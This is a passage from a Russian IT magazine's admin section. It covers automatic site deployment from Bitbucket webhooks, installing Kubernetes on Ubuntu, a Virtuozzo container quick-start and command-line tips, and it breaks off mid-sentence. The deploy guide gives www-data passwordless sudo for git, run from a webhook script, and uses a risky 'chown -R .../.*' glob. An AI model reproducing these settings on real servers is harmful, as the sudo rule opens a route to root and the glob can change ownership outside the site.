После чего тянуть изменения git pull origin master. Главная проблема в том, что
Git не хочет инициализировать репозиторий в каталоге, в котором уже есть
файлы. Выкрутиться можно несколькими способами. Самый простой — про-
делать это все в отдельном каталоге, а затем скопировать в рабочий и про-
верить работу git pull. Но файлы в Git и локальные не должны различаться,
иначе придется использовать git checkout, который набросает лишние строки
в файле, в результате можем получить нерабочий сайт. Причем нет необходи-
мости переносить весь сайт, достаточно перенести только каталог .git.
  Не забываем про права  доступа. Так  как имя начинается с  точки,
то шаблон * не сработает, нужно указать явно.

# chown -R www-data:www-data /var/www/site/.*

Для большего контроля следует в  .gitignore внести все файлы, которых
не должны касаться изменения. Например, для WP это могут быть основные
файлы и каталоги.





                                          Проверяем работу с Bitbucket вручную

wp-config.php
wp-includes/
wp-admin/
wp-content/uploads/

Теперь разработчик может выкладывать код в Bitbucket, а мы забирать на сайт.
Осталось только автоматизировать процесс. В Git это позволяет система ху-
ков — фактически скриптов, выполняющихся в зависимости от наступления
определенного события. Реализованы хуки и в Bitbucket. Причем доступно
сразу два варианта: веб-хук (Webhooks) и службы. В логах они выглядят так:

"POST /post.php HTTP/1.0" 200 236 "-" "Bitbucket-Webhooks/2.0"
"POST /post.php HTTP/1.0" 200 703 "-" "Bitbucket.org"

Настраиваются они через API или веб-интерфейс (меню «Настройки»). На про-
ект можно создать несколько хуков. Для настройки веб-хука нужно указать URL
и событие (всего 21 событие). В Webhooks на указанный в установках URL от-
правляется POST-запрос с данными в JSON-формате (в интерфейсе есть воз-
можность просмотра View requests), при необходимости можно их отобрать
и обработать запрос в зависимости от параметров.
  В «Службах» можно выбрать несколько вариантов, включая и POST-запрос,
Twitter и обращение к различным сервисам.





                                     Добавляем Webhooks в настройках Bitbucket


Нам для нашей схемы достаточно, чтобы Bitbucket при пуше (repo:push) про-
сто «дернул» URL в веб-хуке, а мы по этому событию вытянем коммит из репо-
зитория. Создаем простой скрипт:





В целях безопасности можно его назвать как-нибудь случайно типа 12ghrt78.
php и ограничить доступ к скрипту из сетей Bitbucket: 131.103.20.160/27,
165.254.145.0/26, 104.192.143.0/24. Хотя иногда приходится его вызывать
из браузера. Указываем файл в настройках веб-хука на событие Repository
push. Теперь при пуше разработчиком веб-сервер вытянет коммит из Bitbucket.
В зависимости от настройки хостинга может не хватить прав доступа. В этом
случае ничего не остается, как разрешить выполнять команду через sudo:

shell_exec("sudo /usr/bin/git pull origin master 2>&1");

Набираем команду visudo и в /etc/sudoers записываем:

www-data ALL=(root) NOPASSWD:/usr/bin/git

Теперь должно работать.

ВЫВОД
В статье описана самая простая ситуация, которая встречается в 80% случа-
ев. В идеале затем каждый пункт требует дополнительного внимания, после
тестового прогона следует заняться оптимизацией и попробовать выжать
из сервера максимум.
SYNACK

ЖОНГЛИРУЕМ
КОНТЕЙНЕРАМИ
 РАЗБИРАЕМСЯ С СИСТЕМОЙ УПРАВЛЕНИЯ
 КОНТЕЙНЕРАМИ KUBERNETES





С появлением Docker интерес к контейнерам
вырос взрывообразно: разворачивать при-
ложения оказалось настолько удобно, что
технологию начали использовать буквально           «urban.prankster»Мартин
везде. Облачные сервисы уже дают быстрый      prank.urban@gmail.comПранкевич
доступ к большому количеству виртуальных
машин, которыми нужно управлять. Поэто-
му без инструмента, позволяющего запускать контейнеры
на множестве хостов, масштабировать и выполнять ба-
лансировку, уже не обойтись. Разберемся с решением,
предложенным Google.

ПРОЕКТ KUBERNETES
Проект Kubernetes, или K8S, стартовал в Google в 2014 году, первая публичная
версия 0.1 была представлена сообществу практически через год — в июле
2015-го. Нужно, наверное, особо отметить, что разработка не начиналась
с нуля. В основе K8S лежит суперсекретный (в буквальном смысле этого сло-
ва) проект Гугла Borg — фактически основа основ управления кластерами
в этой корпорации, проект, наработками которого до этого гигант не особо
хотел делиться. Многие из разработчиков Borg перешли в Kubernetes, а вме-
сте с ними туда перекочевали все идеи и решения проблем — перенос кон-
тейнеров без потерь данных, балансировка нагрузки, обнаружение сервисов.
То есть можно сказать, что K8S — точная копия того, что в Google создавали
долгое время, но адаптированная и ориентированная к применению Docker.
Сразу после анонса проекта совместно с Linux Foundation была сформирова-
на Cloud Computing Native Foundation (CNCF), в которую вошли сама Google,
Cisco, IBM, Docker и VMware. Задача CNCF — выработать единый стандарт
и обеспечить взаимодействие между разработчиками.
  В Kubernetes реализованы все функции, необходимые для запуска при-
ложений на основе Docker в конфигурации с высокой доступностью (класте-
ры более 1000 узлов, с multi-availability и multi-region зонами): управление
кластером, планирование, обнаружение сервисов, мониторинг, управление
учетными данными и многое другое. Выглядит это пугающе, но вся внутрен-
няя кухня скрыта от админа. Он просто размещает контейнеры, все осталь-
ное — забота K8S. Для реализации этого используется больше десятка сто-
ронних взаимодействующих услуг, которые вместе обеспечивают требуемую
функциональность. Например, за координацию и хранение настроек отвеча-
ет etcd, создание сетей между контейнерами — flannel. Это несколько услож-
няет первоначальную настройку (хотя в последних релизах это уже не так за-
метно), но позволяет при необходимости просто заменить любой компонент.
Для состыковки служб используются разные CLI, API, которые уже совместно
реализуют API более высокого уровня для сервисных функций, таких как пла-
нирование ресурсов. Нужная функциональность должна быть специально
адаптирована для K8S. Например, обратиться напрямую к API Docker нельзя
(точнее, можно, но очень и очень нежелательно), следует использовать Docker
Compose.
   Kubernetes представляет собой систему с несколькими концепциями.
Многие из этих понятий проявляются как «объекты» или «ресурсы» RESTful
API. Кроме общепринятых, таких как Node, Cluster и Replication controller, есть
и весьма специфические.
•  Pods — единица планирования в Kubernetes. Группа или ресурс, в котором
   могут работать несколько контейнеров. Контейнеры из одного Pod будут за-
   пускаться на одном сервере и могут совместно использовать общие разде-
   лы. Объекты Pod описаны в так называемых PodSpec — YAML/JSON-фай-
   лах.
•  Services — набор контейнеров, которые работают вместе, обеспечивая,
   например, функционирование многоуровневого приложения. K8S поддер-
   живает динамическое наименование и балансировку нагрузки Pods с помо-
  щью абстракций, гарантируя прозрачное подключение к Services по имени
   и отслеживая их текущее состояние.
•  Labels — пары ключ/значение, которые прикрепляются к Pod и фактически
   к любому объекту (сервису), позволяя их легко группировать, отбирать и на-
   значать задания.
•  IP-per-Pod — в Borg сервисы использовали один IP и для распределения
   сетевых ресурсов применялись порты. Это накладывало ряд ограничений.
  В K8S возможно назначить каждому Pod отдельный адрес.
•  Namespaces — способ, позволяющий логически разделить единый кластер
  K8S на несколько виртуальных, каждый из них будет существовать в изоли-
   рованном пространстве, ограниченном квотами, не влияя на других.

На всех узлах кластера minion устанавливаются агенты kubelet и kube-proxy
(прокси-балансировщик). Агенты принимают из специального API сервера
данные PodSpec (файл или HTTP) и гарантируют работоспособность указан-
ных в нем объектов. Прокси обеспечивает перенаправление потоков между
Pod. Мастер кластера содержит специальные компоненты — kube-controller-
manager (менеджер сервисов) и kube-scheduler (планировщик), kube-apiserver,
etcd и flannel. Доступ к API управления, кроме программного способа, можно
получить через консольную утилиту kubectl и веб-интерфейс. С их помощью
можно просматривать текущую конфигурацию, управлять ресурсами, созда-
вать и разворачивать контейнеры.

УСТАНОВКА KUBERNETES
Установка Kubernetes выполняется скриптом, и в процессе следует ориенти-
роваться на официальную инструкцию, адаптировав ее к своему дистрибути-
ву. Она несложная, просто нужно быть очень внимательным. Мануалы из Сети
работают не всегда, так как в разных версиях дистрибутива часто требуются
различные действия и встречаются специфические проблемы, также разра-
ботчики по мере развития K8S меняют процесс развертывания и параметры
в конфигурационных файлах. Установим в простейшем варианте K8S на одну
систему master/minion в Ubuntu 14.04/16.04, так что нам не потребуются неко-
торые компоненты вроде сервера ключей. Перед установкой нужно составить
список всех узлов и их сетевые параметры и роль. Проект предлагает исход-
ные тексты и bash-скрипт.





                                                   Скрипт установки Kubernetes


Первый вариант дает чуть больше контроля, если что-то пойдет не так. Ставим
приложения:

$ sudo apt install docker.io curl git bridge-utils

Для беспарольного входа генерируем ключ. Так как впоследствии понадо-
бятся права root, то ключи генерируем для него. Все параметры оставляем
по умолчанию, на запрос пароля жмем Enter.

$ sudo ssh-keygen -t rsa
$ sudo ssh-copy-id -i /home/user/.ssh/id_rsa.pub 127.0.0.1

Подтверждаем операцию и вводим свой пароль.

$ sudo cat /home/root/.ssh/id_rsa.pub >> /home/root/.ssh/
    authorized_keys

После этого пробуем войти. Должно пустить без запроса пароля:

$ sudo ssh root@127.0.0.1

Если серверов несколько, поступаем аналогично и копируем на них ключи. Не-
смотря на простоту, это очень важный момент. Малейшая ошибка — и даль-
нейшие действия ни к чему не приведут. Забираем актуальный релиз (файл
большой, почти 1,5 Гбайт):

$ wget -c https://github.com/kubernetes/kubernetes/releases/
    download/v1.3.5/kubernetes.tar.gz

Или ветку master:

$ wget -c https://github.com/kubernetes/kubernetes/archive/master.zip

Распаковываем:

$ tar -xvf kubernetes.tar.gz

Архив содержит примеры и готовые настройки в kubernetes/cluster для са-
мых разных конфигураций. Следует выбрать свою и запустить установочный
скрипт. Так как ставим на Ubuntu, то выбираем этот вариант. Для начала нам
нужно указать конфигурацию сети. Смотрим вывод ifconfig — настройку физи-
ческого интерфейса и docker0 — и приступаем к настройке.

# nano kubernetes/cluster/ubuntu/config-default.sh
# Прописываем ноды, она у нас пока одна, остальные при необходимости
добавляем через пробел
export nodes=${nodes:-"root@127.0.0.1"}
# Роль a(master), i(minion), ai(master+minion)
export roles="ai"
# Количество minion
export NUM_MINIONS=${NUM_MINIONS:-1}
# Диапазон IP кластера, приватная сеть rfc1918
export SERVICE_CLUSTER_IP_RANGE=${SERVICE_CLUSTER_IP_RANGE:
    -192.168.1.0/24}
# Диапазон IP flannel сети Docker
export FLANNEL_NET=${FLANNEL_NET:-172.17.42.0/16}
DNS_SERVER_IP=${DNS_SERVER_IP:-"192.168.1.1"}
DNS_DOMAIN=${DNS_DOMAIN:-"cluster.local"}
ENABLE_CLUSTER_UI="${KUBE_ENABLE_CLUSTER_UI:-true}





                                      Конфигурационный файл config-default.sh

Это основные настройки, позволяющие запустить K8S. В файле также настра-
иваются параметры Docker и остальных компонентов, журналирование, мони-
торинг. Если к интернету подключение происходит через прокси, то его пара-
метры следует прописать в PROXY_SETTING.

PROXY_SETTING="http_proxy=http://server:port https_proxy=
    https://server:port"

Теперь можно развернуть кластер.

$ cd kubernetes/cluster
$ KUBERNETES_PROVIDER=ubuntu ./kube-up.sh
Starting cluster using provider: ubuntu

Скрипт закачает и установит все необходимые компоненты (etcd), на все про-
писанные в конфиге ноды. В процессе потребуется указать пароль для управ-
ления узлом. По окончании получим сообщение Cluster validation succeeded.
Причем скрипт повторно будет скачивать последний релиз K8S — чтобы
не повторять это дважды, просто скопируй файл kubernetes.tar.gz в каталог
kubernetes/cluster/ubuntu и подправь скрипт закачки download-release.sh.
  Еще одна проблема, которую не могут устранить уже пару месяцев, — это
ошибка при создании кластера:

saltbase/salt/generate-cert/make-ca-cert.sh: No such file or directory

Нужный файл расположен в каталоге kubernetes/server, его просто забы-
ли положить на место. Это можно сделать вручную или добавить в cluster/
ubuntu/download-release.sh две строки распаковки kubernetes-salt.

tar xzf kubernetes-server-linux-amd64.tar.gz
tar xzf kubernetes-salt.tar.gz
....
cp kubernetes/server/kubernetes/server/bin/kubectl binaries/
cp -a kubernetes/server/kubernetes/saltbase ../

После чего master будет слушать на порту http://127.0.0.1:8080. Остановить
кластер можно также одной командой:

$ KUBERNETES_PROVIDER=ubuntu ./kube-down.sh





                                                     Устанавливаем Kubernetes

УПРАВЛЯЕМ КЛАСТЕРОМ
Для управления K8S используется утилита kubectl. Настройки можно указывать
прямо в командной строке или использовать заранее подготовленный YAML/
JSON-файл. Чтобы было проще вводить команды, укажем в переменной PATH,
где ее искать.

$ export PATH=$PATH:~/kubernetes/cluster/ubuntu/binaries

Для удобства лучше строку прописать сразу в ~/.bash_profile. Два подкатало-
га — master, minion в ubuntu/binaries содержат утилиты для настройки мастера
и подчиненных узлов. Все операции реализуются указанием одного из 20 клю-
чей, список которых можем получить, введя

$ kubectl --help





                                                         Параметры kubectl

Смотрим список нод, настройки и данные кластера.

$ kubectl get nodes
$ kubectl cluster-info
$ kubectl config

В ответ должны получить список указанных ранее в config-default.sh узлов. За-
пустим контейнер с nginx:

$ kubectl run nginxtest --image=nginx --port=80 --hostport=81

K8S сам загрузит и установит образ. Через время к nginx можно обратиться,
подключившись на 81-й порт. Если нод несколько и нам нужна балансировка,
может указываться параметр --create-external-load-balancer и указывается ко-
личество реплик --replicas=№. Текущее состояние репликации выводится ко-
мандой kubectl get rc.
   Возможно заранее прописать настройки контейнера в файле, который за-
тем использовать при развертывании командой create:

$ kubectl create -f nginx.yaml

Если файлов много, то просто указывается каталог, в котором они находятся.
Далее создаем сервис:

$ kubectl expose rc nginx --port=80 --target-port=80
    --service-name=nginx -s "http://192.168.1.2:8080"

Теперь можем проверить доступные сервисы и POD.

$ kubectl get pods

В ответ получим имя (по которому можем обращаться к POD), состояние
и возраст.

$ kubectl get services





                                      Получение информации при помощи kubectl

Если нужно выполнить команду внутри контейнера, то используем kubectl exec.
Kubectl позволяет обращаться к некоторым ресурсам сразу по имени. В на-
стоящее время доступно 19 типов ресурсов, все они описаны в документации
к kubectl. Когда информации много, можно форматировать вывод при помо-
щи -o, отбирая произвольные колонки, или вывести в JSON/YAML-формате
для дальнейшей обработки. Например, выведем в расширенном формате спи-
сок нод и сервисов:

$ kubectl get rc,services -o=wide

Веб-интерфейс доступен по адресу https://<K8S-host>/ui, пароль для вхо-
да можно посмотреть в выводе kubectl config view. Если он не работает, следу-
ет установить его последнюю стабильную версию.

$ kubectl create -f https://rawgit.com/kubernetes/dashboard/master/
    src/deploy/kubernetes-dashboard.yaml





                                                     Веб-интерфейс Kubernetes


Не Kubernetes единым

Параллельно с Kubernetes несколько компаний предложило свои решения,
которые внешне похожи, но существенно различаются по реализации. Это
Docker Swarm от разработчиков Docker, Nomad, Mesos/Marathon и Fleet.
   Docker Swarm позволяет очень просто объединить Docker-хосты в один
виртуальный хост, который внешне выглядит как обычный. Очень прост в раз-
вертывании, фактически нужно запустить еще один контейнер и присоеди-
нить к остальным. Для управления используется REST API интерфейс, со-
вместимый с Docker API. В итоге абсолютно все инструменты, совместимые
с API Docker, — Dokku, Compose, DockerUI и многие другие — могут работать
с кластером Docker Swarm, как с обычным хостом. Это огромный плюс Docker
Swarm, но, если API не поддерживает какую-то возможность, простого реше-
ния проблемы не будет.
   Разработкой Nomad занимается HashiCorp — компания, специализирую-
щаяся на инструментах управления кластерами, виртуальными машинами и об-
лачными сервисами. В итоге получился универсальный многофункциональный
инструмент, который может быть использован для более широкого круга за-
дач. Он сочетает в себе легкий менеджер ресурсов и сложный планировщик,
определяющий, на каком узле развернуть указанные ресурсы. Архитектурно
проще Kubernetes, его легко разворачивать и настраивать. Поддерживает не-
сколько ЦОД и multi-region конфигурации. Тестировался на кластерах до 5000
узлов, хотя вполне способен работать на гораздо более крупных кластерах.
Серверная и клиентская часть реализованы в одном бинарнике, для коорди-
нации или хранения не требуется других внешних служб. Может использовать-
ся Consul для обнаружения сервисов и Vault для организации единого доступа.
Все разработки HashiCorp.
   Marathon представляет собой надстройку над менеджером кластера
Apache Mesos, расширяя его возможности управлять контейнерами в несколь-
ких ЦОД. Изначально разработан и применяется в Twitter. Использует другие
решения Apache Software Foundation для организации, обнаружения прило-
жений, планирования и прочего — ZooKeeper, Chronos, Kafka, Hadoop и дру-
гие. Поддерживается формат контейнера Docker и свой Mesos, но в принципе
можно просто добавить другую технологию. Самостоятельная установка не са-
мое простое дело, поэтому удобный способ развертывания — Mesosphere
Enterprise DC/OS (CentOS + репозиторий). Кстати, уже есть наработки по ин-
теграции API планировщика Kubernetes с Mesos — Kubernetes-Mesos (md).
    Fleet — распределенная система инициализации на основе Systemd и etcd,
которые разработчики представляют как Systemd уровня кластера. Нет неко-
торых важных функций — балансировки нагрузки, интеграции DNS, ACL и дру-
гих. Их реализация пока под вопросом.



ВЫВОД
Несомненно, Kubernetes — интересный проект, который поможет справиться
с увеличивающимся количеством контейнеров Docker и снимет с сисадмина
часть проблем.
SYNACK
   БЫСТРЫЙ СТАРТ
С VIRTUOZZO
   ЗНАКОМИМСЯ С КРУТОЙ СИСТЕМОЙ
    КОНТЕЙНЕРНОЙ ВИРТУАЛИЗАЦИИ





                                     Денис Колисниченко
                                                   dhsilabs@gmail.com





1. ЧТО ТАКОЕ VIRTUOZZO
Parallels Virtuozzo Containers, или просто Virtuozzo, — уникальное решение,
объединяющее гипервизор KVM и виртуализацию на базе контейнеров, про-
дукт компании Virtuozzo, Inc. В отличие от других подобных решений, Virtuozzo
устанавливается на голое железо и представляет собой отдельный дистрибу-
тив Linux (Virtuozzo Linux), который уже оптимизирован для задач виртуализа-
ции и хостинга. Все, что нужно, — взять и установить его на машину, которая
будет сервером виртуализации. При этом не требуется устанавливать или ком-
пилировать ядро, бороться со всевозможными глюками, и никто не ограничи-
вает тебя возможностями ядра 2.6 — Virtuozzo использует ядро 3.10 с долго-
срочной технической поддержкой.

2. КАК ЭТО РАБОТАЕТ
Virtuozzo  Linux устанавливает будущий сервер виртуализации, далее ад-
министратор  создает,  настраивает и  запускает контейнеры или  вирту-
альные машины — каждая из которых превратится в виртуальный сервер
(Virtual Private Server).
  Дальше все зависит от поставленных задач — например, можно превра-
тить виртуальные серверы в веб-серверы и продавать их (типичное решение
для VPS-провайдера). Виртуальные серверы могут работать под управлени-
ем различных дистрибутивов Linux (а внутри виртуальной машины можно за-
пустить вообще любую ОС, даже Windows Server 2012 R2) — ты можешь вы-
брать из предустановленных шаблонов тот, который больше нравится. После
того как виртуальный сервер запущен, уже никто не ограничивает админи-
стратора в установке и настройке программного обеспечения. В виртуальные
серверы дистрибутивы Linux устанавливаются как полноценные, а не как уре-
занные копии.
  Схема виртуализации изображена на рис. 1. Сам рисунок позаимствован
из документации по Virtuozzo. Так, у нас есть железо сервера, есть уровень
виртуализации и есть контейнеры.





  Рис. 0. Немного истории


Контейнеры выглядят как независимые серверы
под управлением Linux. Контейнеры не применя-
ют  для  виртуализации эмуляцию  аппаратуры,
а эффективно разделяют общее ядро и его ре-
сурсы между всеми контейнерами и самим физи-
ческим сервером.
  Каждый контейнер может распоряжаться ре-
сурсами всего физического сервера, также мож-
но эффективно ограничивать использование им
памяти, процессорного времени, операций вво-
да-вывода и сетевого трафика.                            Рис. 1. Схема виртуализации
   Технология контейнерной виртуализации пре-
доставляет наивысшую  плотность среди  дру-
гих решений виртуализации. Можно создать и запустить сотни контейнеров
на стандартном физическом production-решении. В каждом контейнере может
быть только одна операционная система, что упрощает обслуживание и об-
новление контейнеров.

3. СИСТЕМНЫЕ ТРЕБОВАНИЯ И ОГРАНИЧЕНИЯ
Системные требования для автономных установок выглядят так:
•  платформа x86-64 с аппаратной поддержкой виртуализации Intel VT-x
   (с «неограниченным гостем»);
•  минимум четырехъядерный 64-битный процессор;
•  минимум 4 Гбайт оперативной памяти;
•  минимум 64 Гбайт на жестком диске, желательно SSD;
•  сетевой адаптер Ethernet с подключением к сети и корректным IP-адресом.

Проверить, поддерживает ли твой Intel-процессор «неограниченного гостя»,
можно с помощью этого сценария. Запусти его так:

python vmxcap.py | grep -i unrest

Результат должен быть yes.
   Системные требования для размещения серверов в Virtuozzo Storage
Cluster:
•  Virtuozzo 7;
•  1 Гбайт оперативной памяти на каждые 100 Тбайт хранилища;
•  10 Гбайт или более дискового пространства;
•  1 Ethernet-адаптер 1 Гбит/с, статический IP-адрес для каждого адаптера.

Ограничения:
•  максимальный объем оперативки (сертифицированный) — 256 Гбайт, тео-
   ретический максимум — 64 Тбайт;
•  максимальный размер HDD — 16 Тбайт.

4. УСТАНОВКА VIRTUOZZO
Установка Virtuozzo аналогична установке дистрибутива Fedora — инсталлятор
Anaconda абсолютно такой же (рис. 2). Для установки Virtuozzo нужно выпол-
нить следующие действия:
1. Загрузиться с инсталляционного диска.
2. Нажать кнопку Installation destination.
3. Если устанавливаешь на новый сервер, где нет операционной системы, вы-
   бери Automatically configure a partitioning и нажми кнопку Done (рис. 3).
4. Если операционная система уже установлена и есть желание ее сохранить,
   тогда нужно выбрать I will configure partitioning и настроить разделы вручную.
5. Нажать кнопку Begin installation (рис. 4).
6. Во время установки системы нужно установить пароль root и создать одно-
   го обычного пользователя (рекомендуется из соображений безопасности),
   см. рис. 5.





                                                        Рис. 2. Инсталлятор Virtuozzo





                                                              Рис. 3. Разметка диска





                                                Рис. 4. Нажми кнопку Begin installation





                                                           Рис. 5. Установка Virtuozzo


После перезагрузки появится возможность войти в систему (рис. 6).





                                                                Рис. 6. Вход в систему

5. ВЫБОР ШАБЛОНА
Перед созданием контейнера необходимо выбрать шаблон операционной си-
стемы (OS EZ Template), проще говоря — операционную систему, которая бу-
дет в контейнере.
   Для просмотра всех шаблонов введи команду

vzpkg list --with-summary | less





                                                             Рис. 7. Список шаблонов

Дистрибутивы доступны на любой вкус, как RH-совместимые, так и богатый
выбор дистрибутивов Debian/Ubuntu.
   Посмотреть, есть ли какой-то определенный дистрибутив, удобнее при по-
мощи команды grep:

vzpkg list --with-summary | grep centos





                                                   Рис. 8. Отфильтровываем шаблоны


6. СОЗДАНИЕ И НАСТРОЙКА КОНТЕЙНЕРА
Создать контейнер на базе определенного шаблона можно так:

prlctl create MyCT --vmtype ct --ostemplate centos-6-x86_64

Создать контейнер на базе шаблона по умолчанию позволяет команда

prlctl create MyCT --vmtype ct

Шаблон по умолчанию указывается в /etc/vz/vz.conf. Кстати, по умолчанию ис-
пользуется шаблон centos-7.





                                                         Рис. 9. Создание контейнера

Все содержимое контейнеров хранится в приватной области контейнера. Что-
бы выяснить, где она находится, используется команда prlctl list:

prlctl list MyCT -i | grep "Home"
Home: /vz/private/26bc47f6-353f-444b-bc35-b634a88dbbcc

При желании эту область можно перенести на другой жесткий диск — более
быстрый или там, где есть больше свободного пространства.

7. УПРАВЛЕНИЕ РЕСУРСАМИ КОНТЕЙНЕРА
После создания контейнера его конфигурация хранится в файле /etc/vz/
conf/<ID контейнера>.conf. По умолчанию создается контейнер с 64 Мбайт
оперативной памяти, 10 Гбайт дискового пространства, 1000 единиц CPU.
Пример конфигурационного файла приведен на рис. 10.





                                         Рис. 10. Конфигурационный файл контейнера

Очень важен параметр ONBOOT — если он включен (значение yes), то контей-
нер будет загружаться при запуске сервера виртуализации.
   Единственное, к чему придется привыкнуть, — это неудобные идентифика-
торы контейнеров. Вывести список доступных контейнеров можно командой

prlctl list -a





                                                          Рис. 11. Команда prlctl list -a


Поле STATUS показывает состояние контейнера или виртуальной машины, IP-
ADDR — IP-адрес контейнера, T — это тип объекта, может быть или CT (кон-
тейнер), или VM (виртуальная машина), NAME — это имя контейнера/машины,
заданное при создании (в нашем случае MyCT). Конечно же, UUID содержит
уникальный идентификатор контейнера/машины.
   Рассмотрим несколько примеров управления ресурсами контейнера (под-
робная информация есть в мануале). Начнем с изменения производитель-
ности процессора. По умолчанию задается 1000 процессорных единиц (CPU
Units). При желании можно повысить производительность процессора и от-
дать больше процессорных единиц:

prlctl set MyCT --cpuunits 2000

Процессорные единицы — немного абстрактное понятие, но Virtuozzo позво-
ляет задавать конкретные значения. Так, в следующем примере контейнер
не может расходовать более 25% от физического процессорного времени:

prlctl set MyCT --cpulimit 25

Можно задать частоту процессора контейнера (750 МГц):

prlctl set MyCT --cpulimit 750m

Или ограничить количество ядер:

prlctl set MyCT --cpus 1

Теперь о памяти. Задать размер оперативки и свопа можно так:

prlctl set MyCT --memsize 1G --swappages 512M

Можно также отредактировать файл конфигурации контейнера (разумеется,
при остановленном контейнере):

PHYSPAGES="65536:65536"
SWAPPAGES="65536"

Изменить размер виртуального диска позволяет команда prl_disk_tool:

prl_disk_tool resize --hdd /vz/private/b0ba4e74-44d9-49c9-9587-
    49de1b2377cd/root.hdd/root.hds --size 80G

Перед изменением размера нужно остановить контейнер / виртуальную ма-
шину, а также удалить любые снапшоты, если они были созданы.
  Параметры сети задаются так:

prlctl set MyCT --hostname myct.example.com
prlctl set MyCT --ipadd 192.168.52.101

Первая команда определяет имя узла, вторая — его IP-адрес. Процесс на-
стройки контейнера изображен на рис. 12.





                                               Рис. 12. Конфигурирование контейнера




                           Продолжение статьи
SYNACK



                 Начало статьи
   БЫСТРЫЙ СТАРТ
С VIRTUOZZO
   ЗНАКОМИМСЯ С КРУТОЙ СИСТЕМОЙ
    КОНТЕЙНЕРНОЙ ВИРТУАЛИЗАЦИИ





8. УПРАВЛЕНИЕ КОНТЕЙНЕРАМИ
Что ж, после настройки контейнера самое время его запустить. Для этого ис-
пользуется команда

# prlctl start MyCT

После этого сразу вводим команду просмотра состояния prlctl  list -a и ви-
дим, что наш контейнер запущен (статус running) и ему присвоен IP-адрес
192.168.52.101. Попробуем его пропинговать. Результат всех этих действий
приведен на рис. 13. Как видишь, контейнер полностью функционирует — он
запущен, и к нему идет ping.





                                                          Рис. 13. Контейнер запущен

Для остановки и перезапуска контейнера используются команды stop и restart
соответственно:

prlctl stop MyCT
prlctl restart MyCT

Для удаления контейнера его нужно сначала остановить, а потом удалить:

prlctl stop MyCT
prlctl delete MyCT


9. ЗАПУСК КОМАНД И ВХОД В ГОСТЕВУЮ ОПЕРАЦИОННУЮ
СИСТЕМУ
Для выполнения произвольных команд используется команда exec. Первым
делом изменим пароль root:

prlctl exec MyCT passwd





                                       Рис. 14. Изменение пароля root для гостевой ОС

Теперь попробуем подключиться по SSH к гостевой ОС:

ssh 192.168.52.101

Служба sshd на гостевой ОС уже запущена, что упрощает управление госте-
вой операционкой. Вообще, можно вводить команды и через exec, но по SSH,
думаю, будет удобнее. На рис. 15 показано подключение к гостевой операци-
онке, показана разметка диска контейнера, а также использование памяти.





                                            Рис. 15. Подключение к контейнеру по SSH

После установки SSH-подключения можно вводить команды без префикса
prlctl exec, что гораздо удобнее.
   Вот, собственно, и все. Виртуальный сервер создан и работает, далее,
используя SSH, можно приступить к установке программного обеспечения
и к его настройке. Дополнительная информация по настройке и управлению
контейнерами Virtuozzo будет в официальном мануале. Список мануалов до-
ступен по адресу http://docs.virtuozzo.com/master/index.html.

10. ДЕЛАЕМ РАБОТУ С VIRTUOZZO УДОБНЕЕ
Virtuozzo Linux — это обычный дистрибутив, а не какая-то урезанная его вер-
сия. Дистрибутив RH-совместим, что позволяет устанавливать RPM-пакеты.
К счастью, вручную устанавливать ничего не придется, так как Virtuozzo Linux
содержит довольно богатые репозитории, из которых ты можешь установить
свой любимый софт. Я, например, установил mc:

yum install mc





                                             Рис. 16. Установка софта в Virtuozzo Linux





                                      Рис. 17. Файловый менеджер mc в Virtuozzo Linux


На этом все. Дополнительную информацию, в том числе и о совместимости
с родственной OpenVZ, можно найти в блоге разработчика.
 FAQ



                                           Алексей Zemond
                                               Панкратов
                                              3em0nd@gmail.com

FAQ
   ОТВЕТЫ НА ВОПРОСЫ
        ЧИТАТЕЛЕЙ

                (ЕСТЬ ВОПРОСЫ? ШЛИ НА FAQ@GLC.RU)





10 ПРОСТЫХ И ПОЛЕЗНЫХ ТРЮКОВ
ДЛЯ КОМАНДНОЙ СТРОКИ UNIX И LINUX
В современных *nix-системах есть масса команд, утилит и возможностей, о ко-
торых иногда не догадываются даже продвинутые пользователи. Мы выбрали
десять самых простых трюков, которые легко запомнить и можно тут же начать
использовать.
1. Если консоль подвисла, можно ее переинициализировать без завершения
   текущей сессии командой reset.
2. Создать пустой файл или уничтожить все данные в файле поможет команда > file_
   name.txt.
3. Если ты вводил команду, которая требует повышения привилегий, и забыл под-
   ставить sudo, можно воспользоваться таким трюком: sudo !!. Оболочка запустит
   предыдущую команду под рутом.
4. В качестве альтернативы сетевым командам ping и traceroute можно восполь-
   зоваться mtr. Напиши mtr xakep.ru и посмотри, что получится.
5. Команда ps aux покажет много диагностических данных в удобном виде.
6. Если необходимо ввести команду, чтобы она не попала в лог истории, нужно под-
   ставить перед ней пробел. К примеру, ps aux.
7. Если ты набрал команду и хочешь добавить к ней аргументы из команд, набранных
   ранее, удерживай Alt или Esc и нажимай на точку. В строку ввода один за другим
   будут подставляться параметры предыдущих команд.
8. Если ты ввел длинную команду, но допустил опечатку, ее можно исправить при по-
  мощи замены подстроки. Например, мы хотим заменить foo на bar. Если ввести
   просто ^foo, то в предыдущей команде первое вхождение foo будет удалено. Если
   ввести ^foo^bar, то произойдет замена.
9. Для очистки терминала достаточно комбинации клавиш Ctrl + l. Или можешь нажать
   Ctrl + Shift + x. Ну а с командой clear ты уже наверняка знаком.
10. Понадобилось зайти в директорию, вывести список файлов и вернуться об-
   ратно? Для этой распространенной задачи можешь набрать (cd /tmp &&
   ls). Удобно «подсматривать» и в родительский каталог — для этого в каче-
   стве пути просто укажи /...

Наш список не претендует на полноту — мы выбрали лишь самые полезные, лег-
кие для запоминания и часто нужные вещи. К примеру, на сайте commandlinefu.
com ты можешь найти гораздо более полный список с рейтингом по числу поль-
зовательских голосов.

КАК ПРОВЕРИТЬ СКОРОСТНЫЕ ХАРАКТЕРИСТИКИ ФЛЕШКИ
Казалось бы, выбрать флешку — плевое дело, бери любую! Но если нужен но-
ситель информации для тяжелого ежедневного использования, то тут уже вста-
ет вопрос о производительности: не хочется, чтобы новенькая флешка показы-
вала скорость, близкую к скорости дискеты. Чтобы избежать этого, нужно уметь
пользоваться бенчмарками и понимать результаты их работы.
   Нередко, выбрав флешку за дизайн и красивую упаковку, сталкиваешься с
тем, что файл на 100 Мбайт копируется по часу, а про скорость чтения я вообще
промолчу. Именно поэтому на многих сайтах магазинов народ в отзывах выкла-
дывает результаты бенчмарков со скоростными характеристиками девайсов.
Это неплохо помогает при выборе.
   Чтобы показать, как работают тесты, возьму случайную трофейную флешку
ноунейм на 1 Гбайт. Программу для тестирования можно выбрать любую — те-
сты везде почти одинаковые, и суть сводится к тому, что на носитель копирует-
